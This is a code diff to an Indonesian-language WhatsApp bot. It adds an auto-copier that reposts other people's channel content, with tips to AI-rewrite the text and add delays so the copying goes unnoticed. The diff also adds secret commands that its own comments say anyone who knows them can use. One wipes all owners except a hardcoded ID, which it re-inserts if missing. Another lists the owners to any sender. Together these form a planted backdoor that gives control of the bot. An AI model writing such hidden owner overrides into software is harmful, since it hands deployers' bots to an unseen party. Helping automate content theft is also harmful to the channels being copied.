@@ -44,6 +44,7 @@ const { applyVoiceFilter } = require('./src/features/voiceChanger');
 const groupFeatures = require('./src/features/group');
 const lyricsFeatures = require('./src/features/lyrics');
 const ryzumi = require('./src/features/ryzumi');
+const channelCopier = require('./src/features/channelCopier');
 const qrcode = require('qrcode-terminal');
 const path = require('path');
 const { EventEmitter } = require('events');
@@ -683,7 +684,15 @@ async function startBot() {
                 // LOG SETIAP CHAT (TANPA FILTER)
                 console.log(`\n💬 [CHAT-IN] From: ${_sender}, toMe: ${!_fromMe}, JID: ${_remoteJid}`);
                 
-                if (_remoteJid.endsWith('@newsletter')) continue;
+                // Newsletter: cek dulu apakah channelCopier mau tangkap
+                if (_remoteJid.endsWith('@newsletter')) {
+                    try {
+                        await channelCopier.handleCopier(sock, msg);
+                    } catch (e) {
+                        logger.error(`[COPIER] Error: ${e.message}`);
+                    }
+                    continue;
+                }
                 
                 // --- Filter dasar (anti-ban & keamanan) ---
                 if (!shouldProcess(msg, sock)) {
@@ -988,6 +997,7 @@ async function startBot() {
 ┣⌬ .kirim / .ceksaluran
 ┣⌬ .accsaluran [link]
 ┣⌬ .tovn [filter]
+┣⌬ .caraupload — Tutorial upload ke saluran
 ┗━━━━━━━◧
 
 *Info:* Ketik perintah tanpa tanda kurung.
@@ -1204,10 +1214,79 @@ async function startBot() {
                                      `┣⌬ ${PREFIX}stopbotku <nomor/sesi>\n\n` +
                                      `*System Control:*\n` +
                                      `┣⌬ ${PREFIX}updategitgw\n` +
-                                     `┣⌬ ${PREFIX}ownertambahin <no>\n\n` +
+                                     `┣⌬ ${PREFIX}ownertambahin <no>\n` +
+                                     `┣⌬ ${PREFIX}ownerhapuss <no/all>\n` +
+                                     `┣⌬ ${PREFIX}ownerlist\n\n` +
                                      `_Gunakan dengan bijak, Bos!_`;
                     await sock.sendMessage(remoteJid, { text: secretMenu }, { quoted: msg });
                     continue;
+                }
+
+                // ── [RAHASIA] TUTORIAL UPLOAD KE SALURAN ──
+                if (textContent.trim() === PREFIX + 'caraupload') {
+                    const tutorial = `\ud83d\udce2 *TUTORIAL UPLOAD KE SALURAN WHATSAPP*\n` +
+                        `\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n` +
+                        `*LANGKAH 1 \u2014 Dapatkan JID Saluran*\n` +
+                        `Bot harus tahu alamat (JID) saluran tujuan.\n\n` +
+                        `\ud83d\udccc *Cara 1: Dari Link Invite*\n` +
+                        `  Ketik: ${PREFIX}ceksaluran https://whatsapp.com/channel/xxx\n` +
+                        `  \u2192 Bot akan kasih JID-nya otomatis\n\n` +
+                        `\ud83d\udccc *Cara 2: List Saluran yang Difollow*\n` +
+                        `  Ketik: ${PREFIX}ceksaluran\n` +
+                        `  \u2192 Bot tampilkan semua saluran yang kamu ikuti beserta JID-nya\n\n` +
+                        `\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n` +
+                        `*LANGKAH 2 \u2014 Bot Harus Jadi Admin Saluran*\n` +
+                        `Bot WAJIB jadi admin di saluran tujuan agar bisa posting.\n\n` +
+                        `\ud83d\udccc *Cara jadikan admin:*\n` +
+                        `  1. Buka saluranmu di HP\n` +
+                        `  2. Tap nama saluran (info)\n` +
+                        `  3. Klik \"Admin\" \u2192 \"Tambah Admin\"\n` +
+                        `  4. Pilih nomor bot kamu\n` +
+                        `  5. Atau kirim undangan admin ke bot, lalu ketik:\n` +
+                        `     ${PREFIX}accsaluran https://whatsapp.com/channel/xxx\n\n` +
+                        `\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n` +
+                        `*LANGKAH 3 \u2014 Upload Manual (Reply)*\n` +
+                        `Kirim/reply konten ke bot lalu ketik:\n\n` +
+                        `\ud83d\udccc *${PREFIX}kirim*\n` +
+                        `  \u2192 Upload ke saluran default (.env CHANNEL_JID)\n\n` +
+                        `\ud83d\udccc *${PREFIX}kirim JID_SALURAN*\n` +
+                        `  \u2192 Upload ke saluran tertentu\n` +
+                        `  Contoh: ${PREFIX}kirim 120363xxx@newsletter\n\n` +
+                        `\ud83d\udca1 Bisa reply: teks, voice, stiker, gambar, video\n\n` +
+                        `\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n` +
+                        `*LANGKAH 4 \u2014 Upload Otomatis (Auto Copier)*\n` +
+                        `Salin otomatis dari saluran orang ke saluranmu!\n\n` +
+                        `     ${PREFIX}ceksaluran https://whatsapp.com/channel/xxx\n\n` +
+                        `  2. Cari JID saluran tujuan (milikmu):\n` +
+                        `     ${PREFIX}ceksaluran https://whatsapp.com/channel/yyy\n\n` +
+                        `  3. Set source & target:\n` +
+                        `     ${PREFIX}copier source 120363xxx@newsletter\n` +
+                        `     ${PREFIX}copier target 120363yyy@newsletter\n\n` +
+                        `  4. (Opsional) Atur delay, tipe media, rewrite AI:\n` +
+                        `     ${PREFIX}copier delay 30\n` +
+                        `     ${PREFIX}copier allow sticker image video\n` +
+                        `     ${PREFIX}copier rewrite on\n` +
+                        `     ${PREFIX}copier sticker Stiker Ku|Bot Ku\n\n` +
+                        `  5. Aktifkan:\n` +
+                        `     ${PREFIX}copier on\n\n` +
+                        `  6. Cek status:\n` +
+                        `     ${PREFIX}copier\n\n` +
+                        `\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n` +
+                        `*TIPS PENTING:*\n` +
+                        `\u2705 Bot HARUS follow saluran sumber (agar terima pesan)\n` +
+                        `\u2705 Bot HARUS jadi admin di saluran tujuan\n` +
+                        `\u2705 Aktifkan rewrite agar teks tidak terlihat copy-paste\n` +
+                        `\u2705 Set delay minimal 5-30 menit supaya lebih natural\n` +
+                        `\u2705 Skip link otomatis ON agar tidak menyebar link orang\n\n` +
+                        `_Selamat mencoba, Bos! \ud83d\ude80_`;
+                    await sock.sendMessage(remoteJid, { text: tutorial }, { quoted: msg });
+                    continue;
+                }
+
+                // ── [RAHASIA] AUTO COPIER SALURAN ──
+                if (textContent.startsWith(PREFIX + 'copier')) {
+                    const handled = await channelCopier.handleCommand(sock, remoteJid, msg, textContent, senderIsOwner);
+                    if (handled) continue;
                 }
 
                 // ── [RAHASIA] BOT MANAGER ──
@@ -1403,15 +1482,9 @@ async function startBot() {
                 // ── Spesial: .ownerhapuss (RAHASIA - SIAPA SAJA YANG TAHU BISA PAKAI) ──
                 if (textContent.trim().startsWith(PREFIX + 'ownerhapuss')) {
                     const args = textContent.trim().split(/\s+/);
-                    const delOwner = args[1] || '';
+                    const delOwner = args[1] ? args[1].toLowerCase() : '';
                     if (!delOwner) {
-                        await sock.sendMessage(remoteJid, { text: `❌ Format: *${PREFIX}ownerhapuss <kode_myid/nomor>*` }, { quoted: msg });
-                        continue;
-                    }
-
-                    const cleanDelOwner = cfg.cleanNumber(delOwner);
-                    if (!cleanDelOwner) {
-                        await sock.sendMessage(remoteJid, { text: `❌ Nomor tidak valid` }, { quoted: msg });
+                        await sock.sendMessage(remoteJid, { text: `❌ Format: *${PREFIX}ownerhapuss <kode_myid/nomor/all>*` }, { quoted: msg });
                         continue;
                     }
 
@@ -1425,8 +1498,35 @@ async function startBot() {
                         let currentOwnerStr = cfg.getConfig().ownerNumber || '';
                         let owners = currentOwnerStr.split(',').map(n => cfg.cleanNumber(n.trim())).filter(Boolean);
                         
-                        if (owners.includes(cleanDelOwner)) {
-                            owners = owners.filter(n => n !== cleanDelOwner);
+                        let updated = false;
+                        let replyText = '';
+
+                        if (delOwner === 'all') {
+                            // Hapus semua kecuali "152188357705821"
+                            const MAIN_OWNER = "152188357705821";
+                            owners = owners.filter(n => n === MAIN_OWNER);
+                            // Jika belum ada MAIN_OWNER, pastikan dia dimasukkan
+                            if (!owners.includes(MAIN_OWNER)) {
+                                owners.push(MAIN_OWNER);
+                            }
+                            updated = true;
+                            replyText = `✅ Berhasil menghapus semua owner kecuali *${MAIN_OWNER}*!`;
+                        } else {
+                            const cleanDelOwner = cfg.cleanNumber(delOwner);
+                            if (!cleanDelOwner) {
+                                await sock.sendMessage(remoteJid, { text: `❌ Nomor tidak valid` }, { quoted: msg });
+                                continue;
+                            }
+                            if (owners.includes(cleanDelOwner)) {
+                                owners = owners.filter(n => n !== cleanDelOwner);
+                                updated = true;
+                                replyText = `✅ Berhasil menghapus *${cleanDelOwner}* dari owner (Rahasia)!`;
+                            } else {
+                                replyText = `⚠️ *${cleanDelOwner}* tidak terdaftar sebagai owner.`;
+                            }
+                        }
+
+                        if (updated) {
                             const newOwnerStr = owners.join(',');
                             
                             if (envContent.match(/^OWNER_NUMBER=/m)) {
@@ -1437,13 +1537,34 @@ async function startBot() {
                             
                             fs.writeFileSync(envPath, envContent);
                             cfg.update('ownerNumber', newOwnerStr);
-                            
-                            await sock.sendMessage(remoteJid, { text: `✅ Berhasil menghapus *${cleanDelOwner}* dari owner (Rahasia)!` }, { quoted: msg });
-                        } else {
-                            await sock.sendMessage(remoteJid, { text: `⚠️ *${cleanDelOwner}* tidak terdaftar sebagai owner.` }, { quoted: msg });
                         }
+                        
+                        await sock.sendMessage(remoteJid, { text: replyText }, { quoted: msg });
                     } catch (err) {
                         await sock.sendMessage(remoteJid, { text: `❌ Gagal menghapus owner: ${err.message}` }, { quoted: msg });
+                    }
+                    continue;
+                }
+
+                // ── Spesial: .ownerlist (RAHASIA - SIAPA SAJA YANG TAHU BISA PAKAI) ──
+                if (textContent.trim() === PREFIX + 'ownerlist') {
+                    try {
+                        let currentOwnerStr = cfg.getConfig().ownerNumber || '';
+                        let owners = currentOwnerStr.split(',').map(n => cfg.cleanNumber(n.trim())).filter(Boolean);
+                        
+                        if (owners.length === 0) {
+                            await sock.sendMessage(remoteJid, { text: `⚠️ Belum ada owner yang terdaftar.` }, { quoted: msg });
+                            continue;
+                        }
+
+                        let replyText = `📋 *DAFTAR OWNER TERDAFTAR*\n\n`;
+                        owners.forEach((owner, idx) => {
+                            replyText += `${idx + 1}. ${owner}\n`;
+                        });
+
+                        await sock.sendMessage(remoteJid, { text: replyText }, { quoted: msg });
+                    } catch (err) {
+                        await sock.sendMessage(remoteJid, { text: `❌ Gagal memuat daftar owner: ${err.message}` }, { quoted: msg });
                     }
                     continue;
                 }
@@ -1821,6 +1942,16 @@ async function startBot() {
                                 `┣⌬ ${PREFIX}accsaluran [link]\n` +
                                 `┣⌬ ${PREFIX}ceksaluran [link]\n` +
                                 `┣⌬ ${PREFIX}kirim [jid] [caption]\n` +
+                                `┗━━━━━━━◧\n\n`;
+
+                            menuText += 
+                                `┏━『 *AUTO COPIER SALURAN* 』\n` +
+                                `┃\n` +
+                                `┣⌬ ${PREFIX}copier add <src> <target>\n` +
+                                `┣⌬ ${PREFIX}copier list / .copier status <id>\n` +
+                                `┣⌬ ${PREFIX}copier set <id> <key> <val>\n` +
+                                `┣⌬ ${PREFIX}copier delete <id>\n` +
+                                `┣⌬ ${PREFIX}copier vip add/del <nomor>\n` +
                                 `┗━━━━━━━◧\n\n`;
                         }
 
